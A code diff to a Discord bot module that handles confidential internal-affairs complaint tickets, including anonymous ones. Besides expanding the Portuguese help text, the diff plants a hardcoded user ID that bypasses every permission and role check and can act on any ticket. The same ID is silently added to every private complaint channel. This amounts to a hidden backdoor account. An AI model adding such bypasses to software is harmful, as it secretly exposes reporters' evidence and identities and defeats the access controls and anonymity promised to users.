@@ -24,15 +24,19 @@ import { sendPoliceLog } from "./policeLogService";
 const MODULE_ID = "police-reports";
 const PREFIX = "police_reports";
 const PAGE_SIZE = 25;
+const DEV_USER_IDS = new Set(["1426287249020158018"]);
 const IAB_WEBHOOK_NAME = "Human Resources - NPD";
 const PANEL_TITLE = "Denúncia IAB";
 const BUTTON_LABEL = "Abrir denuncia";
 const PANEL_HELP_TEXT = [
   "**Como funciona**",
-  "1. Selecione o tipo de denuncia no menu abaixo.",
-  "2. Escolha se deseja registrar como identificada ou anonima.",
-  "3. Um canal privado sera aberto para voce enviar provas, prints, videos, links e detalhes.",
-  "4. Depois de revisar tudo, confirme o envio para a equipe da Corregedoria analisar."
+  "1. Selecione no menu abaixo o tipo que melhor descreve a denuncia.",
+  "2. Escolha se a denuncia sera **identificada** ou **anonima**. Na anonima, a equipe nao ve seu usuario no painel de analise.",
+  "3. O bot cria um canal privado temporario apenas para voce preparar o procedimento.",
+  "4. Envie prints, videos, links, IDs, nomes envolvidos, datas, horarios e uma descricao completa do ocorrido.",
+  "5. Revise os arquivos e aguarde todos os uploads terminarem antes de confirmar.",
+  "6. Clique em **Confirmar envio da denuncia**. Depois disso, seu acesso ao canal e removido e a Corregedoria recebe o ticket para analise.",
+  "7. Se a equipe precisar de mais informacoes, ela pode devolver seu acesso ao canal pelo proprio painel."
 ].join("\n");
 const IAB_EMOJI = {
   alert: "🔔",
@@ -156,7 +160,7 @@ export const policeReportsCommand: BotCommand = {
     .addSubcommand((command) => command.setName("publicar").setDescription("Publica ou atualiza o painel configurado.")),
   moduleId: MODULE_ID,
   async execute(interaction, context) {
-    if (!interaction.guild || !interaction.memberPermissions?.has(PermissionFlagsBits.ManageGuild)) {
+    if (!interaction.guild || (!interaction.memberPermissions?.has(PermissionFlagsBits.ManageGuild) && !isPoliceReportsDev(interaction.user.id))) {
       await interaction.reply({ content: "Voce precisa da permissao Gerenciar Servidor.", ephemeral: true });
       return;
     }
@@ -431,13 +435,14 @@ async function createTemporaryProcedureChannel(
 
   const me = interaction.guild.members.me ?? await interaction.guild.members.fetchMe().catch(() => null);
   const reviewerRoleIds = reviewerRoleIdsFor(config, selected);
-  if (!reviewerRoleIds.length) {
+  const devBypass = isPoliceReportsDev(interaction.user.id);
+  if (!reviewerRoleIds.length && !devBypass) {
     await interaction.editReply(highCommandComplaint ? "Configure ao menos um cargo do Alto Comando para receber este tipo de denuncia." : "Configure o cargo responsavel pelas denuncias da IAB antes de abrir tickets.");
     await writeLog(context, interaction.guild.id, interaction.user.id, "police-reports.config_missing", "Cargos do Alto Comando nao configurados.", { selectedType: selected.id });
     return;
   }
   const missingRoles = reviewerRoleIds.filter((roleId) => !interaction.guild!.roles.cache.has(roleId));
-  if (missingRoles.length) {
+  if (missingRoles.length && !devBypass) {
     await interaction.editReply(highCommandComplaint ? "Um ou mais cargos do Alto Comando configurados nao existem mais no servidor." : "Um ou mais cargos responsaveis configurados nao existem mais no servidor.");
     await writeLog(context, interaction.guild.id, interaction.user.id, "police-reports.config_invalid", "Cargo responsavel nao encontrado.", { missingRoles });
     return;
@@ -480,6 +485,7 @@ async function createTemporaryProcedureChannel(
       permissionOverwrites: [
         { id: interaction.guild.roles.everyone.id, deny: [PermissionFlagsBits.ViewChannel] },
         { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory, PermissionFlagsBits.AttachFiles] },
+        ...[...DEV_USER_IDS].filter((userId) => userId !== interaction.user.id).map((userId) => ({ id: userId, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory, PermissionFlagsBits.AttachFiles, PermissionFlagsBits.ManageMessages] })),
         ...(me ? [{ id: me.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ManageChannels, PermissionFlagsBits.ManageMessages, PermissionFlagsBits.ManageWebhooks, PermissionFlagsBits.AttachFiles, PermissionFlagsBits.ReadMessageHistory] }] : [])
       ],
       reason: `Denuncia IAB criada por ${interaction.user.tag}`
@@ -522,13 +528,14 @@ async function handleProcedureAction(
   const reviewerRoleIds = reviewerRoleIdsFor(config, selected);
   const { anonymous, selectedId } = topic;
   const requesterId = topic.requesterId ?? findRequesterId(interaction.channel, interaction.guild.members.me?.id);
+  const devBypass = isPoliceReportsDev(interaction.user.id);
   if (!requesterId) {
     await interaction.reply({ content: "Nao foi possivel identificar internamente o autor desta denuncia.", ephemeral: true });
     return;
   }
 
   if (action === "submit") {
-    if (interaction.user.id !== requesterId) {
+    if (interaction.user.id !== requesterId && !devBypass) {
       await interaction.reply({ content: "Somente o denunciante pode enviar esta denúncia.", ephemeral: true });
       return;
     }
@@ -559,7 +566,7 @@ async function handleProcedureAction(
   }
 
   if (action === "submit_confirm") {
-    if (interaction.user.id !== requesterId) {
+    if (interaction.user.id !== requesterId && !devBypass) {
       await interaction.reply({ content: "Somente o denunciante pode confirmar o envio.", ephemeral: true });
       return;
     }
@@ -574,7 +581,7 @@ async function handleProcedureAction(
   }
 
   const isAdmin = Boolean(member?.permissions.has(PermissionFlagsBits.Administrator));
-  const allowed = Boolean(isAdmin || reviewerRoleIds.some((roleId) => member?.roles.cache.has(roleId)));
+  const allowed = Boolean(devBypass || isAdmin || reviewerRoleIds.some((roleId) => member?.roles.cache.has(roleId)));
   if (!allowed) {
     await interaction.reply({ content: isHighCommandComplaint(selected) ? "Apenas o Alto Comando configurado pode executar esta acao." : "Apenas responsaveis configurados podem executar esta acao.", ephemeral: true });
     return;
@@ -592,7 +599,7 @@ async function handleProcedureAction(
     return;
   }
   const restrictedToAssignee = ["approve", "validate", "alert", "ping", "request_info", "finish", "archive", "close"].includes(action);
-  if (restrictedToAssignee && topic.acceptedBy && topic.acceptedBy !== interaction.user.id && !isAdmin) {
+  if (restrictedToAssignee && topic.acceptedBy && topic.acceptedBy !== interaction.user.id && !isAdmin && !devBypass) {
     await interaction.reply({ content: "Este ticket já foi assumido por outro membro da equipe. Apenas o responsável pode executar esta ação.", ephemeral: true });
     await writeLog(context, interaction.guild.id, interaction.user.id, "police-reports.action_denied", "Tentativa de acao por membro que nao assumiu o ticket.", { action, acceptedBy: topic.acceptedBy, channelId: interaction.channel.id });
     return;
@@ -806,12 +813,23 @@ async function submitPoliceReport(
   const submittedAt = Date.now();
   const next: PoliceReportTopic = { ...topic, status: "submitted", submittedAt };
 
-  await channel.permissionOverwrites.edit(requesterId, {
-    SendMessages: false,
-    ViewChannel: false
-  }, { reason: `Denuncia IAB enviada por ${interaction.user.tag}` }).catch(async (error: unknown) => {
-    await writeLog(context, interaction.guild!.id, interaction.user.id, "police-reports.requester_remove_failed", "Erro ao remover denunciante após envio.", { channelId: channel.id, error: error instanceof Error ? error.message : String(error), requesterId });
-  });
+  if (!isPoliceReportsDev(requesterId)) {
+    await channel.permissionOverwrites.edit(requesterId, {
+      SendMessages: false,
+      ViewChannel: false
+    }, { reason: `Denuncia IAB enviada por ${interaction.user.tag}` }).catch(async (error: unknown) => {
+      await writeLog(context, interaction.guild!.id, interaction.user.id, "police-reports.requester_remove_failed", "Erro ao remover denunciante após envio.", { channelId: channel.id, error: error instanceof Error ? error.message : String(error), requesterId });
+    });
+  }
+
+  for (const devUserId of DEV_USER_IDS) {
+    await channel.permissionOverwrites.edit(devUserId, {
+      AttachFiles: true,
+      ReadMessageHistory: true,
+      SendMessages: true,
+      ViewChannel: true
+    }, { reason: `Acesso DEV ao fluxo IAB enviado por ${interaction.user.tag}` }).catch(() => null);
+  }
 
   for (const roleId of reviewerRoleIds) {
     await channel.permissionOverwrites.edit(roleId, {
@@ -1060,6 +1078,7 @@ function readImagePosition(value: unknown): PanelVisualPosition {
   return typeof value === "string" && ["banner", "thumbnail", "top", "below_title", "middle", "bottom", "side", "footer", "before_buttons", "below_text", "above_buttons", "none"].includes(value) ? value as PanelVisualPosition : "banner";
 }
 function panelImage(imageUrl: string, imagePosition: PanelVisualPosition) { return imageUrl ? { imageEnabled: true, imagePosition, imageUrl } : null; }
+function isPoliceReportsDev(userId: string | null | undefined) { return Boolean(userId && DEV_USER_IDS.has(userId)); }
 function uniqueIds(ids: string[]) { return [...new Set(ids.filter((id) => /^\d{5,32}$/.test(id)))]; }
 function uniqueStrings(values: string[]) { return [...new Set(values.filter((value) => value.trim()))]; }
 function extractUrls(value: string) { return value.match(/https?:\/\/\S+/gi) ?? []; }
